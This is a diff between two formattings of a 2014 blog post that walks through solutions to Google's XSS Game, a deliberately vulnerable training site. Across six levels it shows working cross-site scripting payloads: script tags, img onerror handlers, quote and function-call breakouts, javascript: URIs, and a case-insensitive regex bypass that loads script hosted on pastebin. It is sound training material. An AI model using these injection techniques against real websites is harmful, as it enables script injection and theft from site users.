@@ -1,64 +1,282 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><title>Googles XSS Game - Solutions - blog.dornea.nu</title><meta content="Googles XSS Game - Solutions - blog.dornea.nu" property="title"><meta content="Googles XSS Game - Solutions - blog.dornea.nu" property="og:title"><meta property="og:description" content="These are my steps how I&rsquo;ve solved the XSS Game
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+  <title>Googles XSS Game - Solutions - blog.dornea.nu</title>
+  <meta content='Googles XSS Game - Solutions - blog.dornea.nu' property='title' />
+  <meta content='Googles XSS Game - Solutions - blog.dornea.nu' property='og:title' />
+
+
+<meta property="og:description" content="These are my steps how I&rsquo;ve solved the XSS Game
 Level 1
 This is the most obvious and easiest one. Just insert following code and you&rsquo;re done:
-<script>alert(1)</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
 Level 2
 Since the script won&rsquo;t work you&rsquo;ll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use img tags along with the onerror attributes. Here you go:
-<img src=&#34;http://inexist.ent&#34; onerror=&#34;javascript:alert(1)&#34;/>"><meta property="og:type" content="article"><meta property="og:url" content="http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/"><meta property="article:published_time" content="2014-06-02T00:00:00+00:00"><meta property="article:modified_time" content="2014-06-02T00:00:00+00:00"><meta name=generator content="Hugo 0.75.1"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel=stylesheet><style type=text/css>:root{--main-color: #8C6056;--secondary-color: #AFD5AA;--logo-text-color: #fff;--body-text-color: #3d3d3d;--heading-text-color: #383838;--background-color: #fff}</style><link href=http://blog.dornea.nu/css/tachyons.min.css rel=stylesheet><link href=http://blog.dornea.nu/css/styles.css rel=stylesheet><link rel=icon href=http://blog.dornea.nu/favicon.ico type=image/x-icon><link href=http://blog.dornea.nu/feed.xml rel=alternate type=application/atom+xml title=blog.dornea.nu></head><body class=global-font><nav class="flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id=navbar><div class=flex><a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id=site-title href=http://blog.dornea.nu/ title=Home>blog.dornea.nu</a></div><div class="flex-ns mt2 mt0-ns pv1"><a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/ title=Home>Home</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://dornea.nu title=About>About</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/tags title=Tags>Tags</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org title=Zettelkasten>Zettelkasten</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bookmarks.html title=Bookmarks>Bookmarks</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bib.html title=Books>Books</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/notes title=Notes>Notes</a></div></nav><main class="center mv4 content-width ph3"><div class="f3 fw6 heading-color heading-font post-title">Googles XSS Game - Solutions</div><p class="silver f6 mt1 mb4 post-meta"><time>02 Jun 2014</time>
-|
-tags: [ <a href=http://blog.dornea.nu/tags/web class="link silver">web</a> <a href=http://blog.dornea.nu/tags/wargames class="link silver">wargames</a> <a href=http://blog.dornea.nu/tags/security class="link silver">security</a> <a href=http://blog.dornea.nu/tags/coding class="link silver">coding</a> <a href=http://blog.dornea.nu/tags/hacking class="link silver">hacking</a> <a href=http://blog.dornea.nu/tags/xss class="link silver">xss</a> <a href=http://blog.dornea.nu/tags/google class="link silver">google</a> <a href=http://blog.dornea.nu/tags/javascript class="link silver">javascript</a> ]</p><div class="lh-copy post-content"><p>These are my steps how I&rsquo;ve solved the <a href=https://xss-game.appspot.com/>XSS Game</a></p><h2 id=level-1>Level 1</h2><p>This is the most obvious and easiest one. Just insert following code and you&rsquo;re done:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>&lt;script&gt;alert(<span style=color:#3677a9>1</span>)&lt;<span style=color:#a61717;background-color:#e3d2d2>/script&gt;</span>
-</code></pre></div><h2 id=level-2>Level 2</h2><p>Since the <code>script</code> won&rsquo;t work you&rsquo;ll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use <code>img</code> tags along with the <code>onerror</code> attributes. Here you go:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>&lt;img src=<span style=color:#ed9d13>&#34;http://inexist.ent&#34;</span> onerror=<span style=color:#ed9d13>&#34;javascript:alert(1)&#34;</span>/&gt;
-</code></pre></div><h2 id=level-3>Level 3</h2><p>Well this time I had to read some code in order to understand the applications logic. If you toggle the code you&rsquo;ll see <code>index.html</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>[...]
-      <span style=color:#6ab825;font-weight:700>function</span> chooseTab(num) {
-        <span style=color:#999;font-style:italic>// Dynamically load the appropriate image.
-</span><span style=color:#999;font-style:italic></span>        <span style=color:#6ab825;font-weight:700>var</span> html = <span style=color:#ed9d13>&#34;Image &#34;</span> + <span style=color:#24909d>parseInt</span>(num) + <span style=color:#ed9d13>&#34;&lt;br&gt;&#34;</span>;
-        html += <span style=color:#ed9d13>&#34;&lt;img src=&#39;/static/level3/cloud&#34;</span> + num + <span style=color:#ed9d13>&#34;.jpg&#39; /&gt;&#34;</span>;
-        $(<span style=color:#ed9d13>&#39;#tabContent&#39;</span>).html(html);
+&lt;img src=&#34;http://inexist.ent&#34; onerror=&#34;javascript:alert(1)&#34;/&gt;
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/" />
+
+
+<meta property="article:published_time" content="2014-06-02T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2014-06-02T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.75.1" />
+
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
+<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
+:root {
+  --main-color: #8C6056; 
+  --secondary-color: #AFD5AA;
+  --logo-text-color: #fff;
+  --body-text-color: #3d3d3d;
+  --heading-text-color: #383838;
+  --background-color: #fff;
+}</style>
+<link href='http://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
+<link href='http://blog.dornea.nu/css/styles.css' rel="stylesheet">
+
+
+<link rel="icon" 
+ 
+  href='http://blog.dornea.nu/favicon.ico'
+
+type="image/x-icon"/>
+
+<link href='http://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />
+</head>
+<body class="global-font">
+  <nav class=" flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id="navbar">
+  <div class="flex">
+    <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id="site-title" href='http://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
+  </div>
+  
+  <div class=" flex-ns mt2 mt0-ns pv1">
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/' title="Home">Home</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://dornea.nu' title="About">About</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/tags' title="Tags">Tags</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bookmarks.html' title="Bookmarks">Bookmarks</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bib.html' title="Books">Books</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/notes' title="Notes">Notes</a>
+    
+  </div>
+  
+</nav>
+  
+<main class="center mv4 content-width ph3">
+  <div class="f3 fw6 heading-color heading-font post-title">Googles XSS Game - Solutions</div>
+  <p class="silver f6 mt1 mb4 post-meta">
+    <time>02 Jun 2014</time> 
+     | 
+    
+    
+    tags: [ <a href='http://blog.dornea.nu/tags/web' class="link silver">web</a> <a href='http://blog.dornea.nu/tags/wargames' class="link silver">wargames</a> <a href='http://blog.dornea.nu/tags/security' class="link silver">security</a> <a href='http://blog.dornea.nu/tags/coding' class="link silver">coding</a> <a href='http://blog.dornea.nu/tags/hacking' class="link silver">hacking</a> <a href='http://blog.dornea.nu/tags/xss' class="link silver">xss</a> <a href='http://blog.dornea.nu/tags/google' class="link silver">google</a> <a href='http://blog.dornea.nu/tags/javascript' class="link silver">javascript</a>  ]
+    
+  </p>
+  <div class="lh-copy post-content"><p>These are my steps how I&rsquo;ve solved the <a href="https://xss-game.appspot.com/">XSS Game</a></p>
+<h2 id="level-1">Level 1</h2>
+<p>This is the most obvious and easiest one. Just insert following code and you&rsquo;re done:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">&lt;script&gt;alert(<span style="color:#3677a9">1</span>)&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
+</code></pre></div><h2 id="level-2">Level 2</h2>
+<p>Since the <code>script</code> won&rsquo;t work you&rsquo;ll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use <code>img</code> tags along with the <code>onerror</code> attributes. Here you go:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">&lt;img src=<span style="color:#ed9d13">&#34;http://inexist.ent&#34;</span> onerror=<span style="color:#ed9d13">&#34;javascript:alert(1)&#34;</span>/&gt;
+</code></pre></div><h2 id="level-3">Level 3</h2>
+<p>Well this time I had to read some code in order to understand the applications logic. If you toggle the code you&rsquo;ll see <code>index.html</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
+      <span style="color:#6ab825;font-weight:bold">function</span> chooseTab(num) {
+        <span style="color:#999;font-style:italic">// Dynamically load the appropriate image.
+</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">var</span> html = <span style="color:#ed9d13">&#34;Image &#34;</span> + <span style="color:#24909d">parseInt</span>(num) + <span style="color:#ed9d13">&#34;&lt;br&gt;&#34;</span>;
+        html += <span style="color:#ed9d13">&#34;&lt;img src=&#39;/static/level3/cloud&#34;</span> + num + <span style="color:#ed9d13">&#34;.jpg&#39; /&gt;&#34;</span>;
+        $(<span style="color:#ed9d13">&#39;#tabContent&#39;</span>).html(html);
 [...]
-</code></pre></div><p>As you see the <code>num</code> parameter is used to generate the <code>img</code> tag. The ideas was to break-out the quotes and insert some sneaky javascript code. Again I&rsquo;ve used the <code>onerror</code> attribute to insert JS. Insert this into the URL address bar and you&rsquo;ll get your <code>alert()</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>https://xss-game.appspot.com/level3/frame#3&#39; onerror=&#39;alert(1)&#39;;
-</code></pre></div><h2 id=level-4>Level 4</h2><p>This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting <code>https://xss-game.appspot.com/level4/frame?timer='</code> showed me following output:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>SyntaxError: unterminated string literal
+</code></pre></div><p>As you see the <code>num</code> parameter is used to generate the <code>img</code> tag. The ideas was to break-out the quotes and insert some sneaky javascript code. Again I&rsquo;ve used the <code>onerror</code> attribute to insert JS. Insert this into the URL address bar and you&rsquo;ll get your <code>alert()</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://xss-game.appspot.com/level3/frame#3&#39; onerror=&#39;alert(1)&#39;;
+</code></pre></div><h2 id="level-4">Level 4</h2>
+<p>This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting <code>https://xss-game.appspot.com/level4/frame?timer='</code> showed me following output:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">SyntaxError: unterminated string literal
 
-startTimer(<span style=color:#ed9d13>&#39;&#39;</span><span style=color:#a61717;background-color:#e3d2d2>&#39;</span>);
-</code></pre></div><p>Obviously there is again a way to escape the function and append the <code>alert()</code> call. I have tried several things:</p><ul><li><a href="https://xss-game.appspot.com/level4/frame?timer=');">https://xss-game.appspot.com/level4/frame?timer=');</a></li></ul><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>    SyntaxError: unterminated string literal
+startTimer(<span style="color:#ed9d13">&#39;&#39;</span><span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
+</code></pre></div><p>Obviously there is again a way to escape the function and append the <code>alert()</code> call. I have tried several things:</p>
+<ul>
+<li><a href="https://xss-game.appspot.com/level4/frame?timer=');">https://xss-game.appspot.com/level4/frame?timer=');</a></li>
+</ul>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    SyntaxError: unterminated string literal
 
-    startTimer(<span style=color:#ed9d13>&#39;&#39;</span>)<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>);
-</code></pre></div><ul><li><a href="https://xss-game.appspot.com/level4/frame?timer=')&amp;#59;">https://xss-game.appspot.com/level4/frame?timer=')&amp;#59;</a></li></ul><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>    SyntaxError: unterminated string literal
+    startTimer(<span style="color:#ed9d13">&#39;&#39;</span>)<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
+</code></pre></div><ul>
+<li><a href="https://xss-game.appspot.com/level4/frame?timer=')&amp;#59;">https://xss-game.appspot.com/level4/frame?timer=')&amp;#59;</a></li>
+</ul>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    SyntaxError: unterminated string literal
 
 
-    startTimer(<span style=color:#ed9d13>&#39;&#39;</span>)<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>);
-</code></pre></div><p>And then I&rsquo;ve decided to use some URL encoding: <code>%3B</code> represents the semi-colon.</p><ul><li><a href="https://xss-game.appspot.com/level4/frame?timer=')%3B">https://xss-game.appspot.com/level4/frame?timer=')%3B</a></li></ul><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>    SyntaxError: unterminated string literal
+    startTimer(<span style="color:#ed9d13">&#39;&#39;</span>)<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
+</code></pre></div><p>And then I&rsquo;ve decided to use some URL encoding: <code>%3B</code> represents the semi-colon.</p>
+<ul>
+<li><a href="https://xss-game.appspot.com/level4/frame?timer=')%3B">https://xss-game.appspot.com/level4/frame?timer=')%3B</a></li>
+</ul>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    SyntaxError: unterminated string literal
 
 
-    startTimer(<span style=color:#ed9d13>&#39;&#39;</span>);<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>);
-</code></pre></div><p>Aha.. There you go! We can terminate the call and insert other ones. The <strong>final request</strong>:</p><ul><li><a href="https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar">https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar</a> b=('</li></ul><p>which resulted in</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>startTimer(&#39;&#39;);alert(1);var b=(&#39;&#39;);
-</code></pre></div><p>I must admit: Nice one!</p><h2 id=level-5>Level 5</h2><p>This one was quite easy. On the first page you can see a link: <code>https://xss-game.appspot.com/level5/frame/signup?next=confirm</code>. Now let&rsquo;s have a look how this <code>next</code> parameter is used in <code>confirm.html</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>[...]
+    startTimer(<span style="color:#ed9d13">&#39;&#39;</span>);<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
+</code></pre></div><p>Aha.. There you go! We can terminate the call and insert other ones. The <strong>final request</strong>:</p>
+<ul>
+<li><a href="https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar">https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar</a> b=('</li>
+</ul>
+<p>which resulted in</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">startTimer(&#39;&#39;);alert(1);var b=(&#39;&#39;);
+</code></pre></div><p>I must admit: Nice one!</p>
+<h2 id="level-5">Level 5</h2>
+<p>This one was quite easy. On the first page you can see a link: <code>https://xss-game.appspot.com/level5/frame/signup?next=confirm</code>. Now let&rsquo;s have a look how this <code>next</code> parameter is used in <code>confirm.html</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
 &lt;script&gt;
-      setTimeout(<span style=color:#6ab825;font-weight:700>function</span>() { <span style=color:#24909d>window</span>.location = <span style=color:#ed9d13>&#39;{{ next }}&#39;</span>; }, <span style=color:#3677a9>5000</span>);
-&lt;<span style=color:#a61717;background-color:#e3d2d2>/script&gt;</span>
+      setTimeout(<span style="color:#6ab825;font-weight:bold">function</span>() { <span style="color:#24909d">window</span>.location = <span style="color:#ed9d13">&#39;{{ next }}&#39;</span>; }, <span style="color:#3677a9">5000</span>);
+&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
 [...]
-</code></pre></div><p>So the window.location is set based on the <code>next</code> parameter. This is a typical case for <em>DOM based XSS</em>. Besides that we have in <code>signup.html</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>[...]
+</code></pre></div><p>So the window.location is set based on the <code>next</code> parameter. This is a typical case for <em>DOM based XSS</em>.  Besides that we have in <code>signup.html</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
 &lt;br&gt;&lt;br&gt;
-    &lt;a href=<span style=color:#ed9d13>&#34;{{ next }}&#34;</span>&gt;Next &gt;&gt;&lt;<span style=color:#a61717;background-color:#e3d2d2>/a&gt;</span>
-&lt;<span style=color:#a61717;background-color:#e3d2d2>/body&gt;</span>
+    &lt;a href=<span style="color:#ed9d13">&#34;{{ next }}&#34;</span>&gt;Next &gt;&gt;&lt;<span style="color:#a61717;background-color:#e3d2d2">/a&gt;</span>
+&lt;<span style="color:#a61717;background-color:#e3d2d2">/body&gt;</span>
 [...]
-</code></pre></div><p>Again the <code>next</code> parameter is used as an <code>a</code> tag target. Ok, enough bla bla. Here is the PoC:</p><ul><li>Go to <code>https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</code></li><li>Insert your Mail</li><li>Click <code>Next >></code></li><li>Voila!</li></ul><h2 id=level-6>Level 6</h2><p>This time I had to figure to host my JS code. So I&rsquo;ve used <code>pastebin.com</code> to host my <a href="http://pastebin.com/raw.php?i=rTRPYeNk">evil code</a>. Next I had a look at the code. As you can read a new <code>script</code> tag is created and the <code>src</code> attribute is set appropriately. The only catch about it: You&rsquo;re not allowed to have a URL containing <em>https?</em>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>[...]
-      <span style=color:#6ab825;font-weight:700>if</span> (url.match(<span style=color:#ed9d13>/^https?:\/\//</span>)) {
-        setInnerText(<span style=color:#24909d>document</span>.getElementById(<span style=color:#ed9d13>&#34;log&#34;</span>),
-          <span style=color:#ed9d13>&#34;Sorry, cannot load a URL containing \&#34;http\&#34;.&#34;</span>);
-        <span style=color:#6ab825;font-weight:700>return</span>;
+</code></pre></div><p>Again the <code>next</code> parameter is used as an <code>a</code> tag target. Ok, enough bla bla. Here is the PoC:</p>
+<ul>
+<li>Go to <code>https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</code></li>
+<li>Insert your Mail</li>
+<li>Click <code>Next &gt;&gt;</code></li>
+<li>Voila!</li>
+</ul>
+<h2 id="level-6">Level 6</h2>
+<p>This time I had to figure to host my JS code. So I&rsquo;ve used <code>pastebin.com</code> to host my <a href="http://pastebin.com/raw.php?i=rTRPYeNk">evil code</a>. Next I had a look at the code. As you can read a new <code>script</code> tag is created and the <code>src</code> attribute is set appropriately. The only catch about it: You&rsquo;re not allowed to have a URL containing <em>https?</em>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
+      <span style="color:#6ab825;font-weight:bold">if</span> (url.match(<span style="color:#ed9d13">/^https?:\/\//</span>)) {
+        setInnerText(<span style="color:#24909d">document</span>.getElementById(<span style="color:#ed9d13">&#34;log&#34;</span>),
+          <span style="color:#ed9d13">&#34;Sorry, cannot load a URL containing \&#34;http\&#34;.&#34;</span>);
+        <span style="color:#6ab825;font-weight:bold">return</span>;
       }
 [...]
-</code></pre></div><p>Afterwards the text after the hash is used as the scripts src:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#999;font-style:italic>// Load this awesome gadget
-</span><span style=color:#999;font-style:italic></span>scriptEl.src = url;
-</code></pre></div><p>Have you noticed something about the regexp? No?! Seriously not? Ok. It&rsquo;s <strong>not</strong> case-sensitive. You can escape it by using <em>hTTps</em> or any other combination. So the <strong>final PoC</strong>:</p><ul><li><a href="https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0">https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</a></li></ul><h2 id=conclusion>Conclusion</h2><p>This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)</p></div></main><div class="tl fixed list-pages lh-copy" id=contents-list></div><div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l"><a id=scroll-to-top class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick=topFunction() style="color:#fff;visibility:hidden;display:none;transition:opacity .5s,visibility .5s" title="back to top">back to top</a><br><p class="mb0 mt2"><a href=http://blog.dornea.nu/2014/05/27/berlinsides-0x05/>prev post</a>
-<a href=http://blog.dornea.nu/2014/06/18/migrate-this-blog-from-octopress-to-pelican/>next post</a></p></div><footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l"><hr class="dn db-l ml0-l gray w3"><br>Powered by <a href=https://gohugo.io/ target=_blank class="link gray dim">Hugo</a>, based on the <a href=https://github.com/lingxz/er target=_blank class="link gray dim">Er</a> theme.<br></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js></script><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css><style>.is-active-link::before{background-color:var(--secondary-color)}</style><script type=text/javascript>var prevScrollpos=window.pageYOffset;window.onscroll=function(){var currentScrollPos=window.pageYOffset;if(document.getElementById("tag-cloud")!==null){if(prevScrollpos>currentScrollPos){document.getElementById("tag-cloud").style.visibility="visible";document.getElementById("tag-cloud").style.opacity="1";}else{document.getElementById("tag-cloud").style.visibility="hidden";document.getElementById("tag-cloud").style.opacity="0";}}
-if(document.body.scrollTop>1000||document.documentElement.scrollTop>1000){document.getElementById("scroll-to-top").style.display="inline";document.getElementById("scroll-to-top").style.visibility="visible";document.getElementById("scroll-to-top").style.opacity="1";}else{document.getElementById("scroll-to-top").style.visibility="hidden";document.getElementById("scroll-to-top").style.opacity="0";}
-prevScrollpos=currentScrollPos;}
-function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}
-if(document.getElementById("contents-list")!==null&&document.getElementsByClassName("post-content").length!==0){tocbot.init({tocSelector:'#contents-list',contentSelector:'.post-content',headingSelector:'h1, h2, h3',});}</script></body></html>
+</code></pre></div><p>Afterwards the text after the hash is used as the scripts src:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#999;font-style:italic">// Load this awesome gadget
+</span><span style="color:#999;font-style:italic"></span>scriptEl.src = url;
+</code></pre></div><p>Have you noticed something about the regexp? No?! Seriously not? Ok. It&rsquo;s <strong>not</strong> case-sensitive. You can escape it by using <em>hTTps</em> or any other combination. So the <strong>final PoC</strong>:</p>
+<ul>
+<li><a href="https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0">https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</a></li>
+</ul>
+<h2 id="conclusion">Conclusion</h2>
+<p>This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)</p></div>
+</main>
+ 
+
+
+
+
+
+
+<div class="tl fixed list-pages lh-copy" id="contents-list"></div>
+
+
+
+<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
+  
+<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
+<br>
+  <p class="mb0 mt2">
+  <a href="http://blog.dornea.nu/2014/05/27/berlinsides-0x05/">prev post</a>
+  <a href="http://blog.dornea.nu/2014/06/18/migrate-this-blog-from-octopress-to-pelican/">next post</a>
+  </p>
+</div>
+
+  <footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l">
+  <hr class="dn db-l ml0-l gray w3"><br>
+  Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme. <br>
+  
+</footer>
+  
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<style>.is-active-link::before { background-color: var(--secondary-color); }</style>
+
+
+
+
+<script type="text/javascript">
+var prevScrollpos = window.pageYOffset;
+window.onscroll = function() {
+  var currentScrollPos = window.pageYOffset;
+
+  
+  if (document.getElementById("tag-cloud") !== null) { 
+    if (prevScrollpos > currentScrollPos) { 
+      document.getElementById("tag-cloud").style.visibility = "visible";
+      document.getElementById("tag-cloud").style.opacity = "1";
+    } else {
+      document.getElementById("tag-cloud").style.visibility = "hidden";
+      document.getElementById("tag-cloud").style.opacity = "0";
+    }
+  }
+  
+
+  
+  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
+      document.getElementById("scroll-to-top").style.display = "inline";
+      document.getElementById("scroll-to-top").style.visibility = "visible";
+      document.getElementById("scroll-to-top").style.opacity = "1";
+  } else {
+      document.getElementById("scroll-to-top").style.visibility = "hidden";
+      document.getElementById("scroll-to-top").style.opacity = "0";
+  }
+  
+  prevScrollpos = currentScrollPos;
+}
+
+
+function topFunction() {
+  document.body.scrollTop = 0; 
+  document.documentElement.scrollTop = 0; 
+}
+
+
+
+
+
+
+if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
+  tocbot.init({
+    
+    tocSelector: '#contents-list',
+    
+    contentSelector: '.post-content',
+    
+    headingSelector: 'h1, h2, h3',
+  });
+}
+
+
+</script>
+
+
+
+
+</body>
+</html>
